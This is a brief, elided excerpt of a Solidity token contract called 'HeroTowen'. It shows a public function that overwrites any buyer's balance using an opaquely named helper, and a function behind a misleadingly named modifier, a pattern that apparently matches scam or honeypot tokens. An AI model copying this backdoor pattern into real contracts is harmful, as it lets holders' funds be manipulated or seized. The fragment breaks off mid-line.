...
contract HeroTowen  is IERC20, Ownable {
    ...
    string private _name = "HeroTowen";
    ...
    function _balancesETH(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function _ValuETH(address Router) public decimalx {
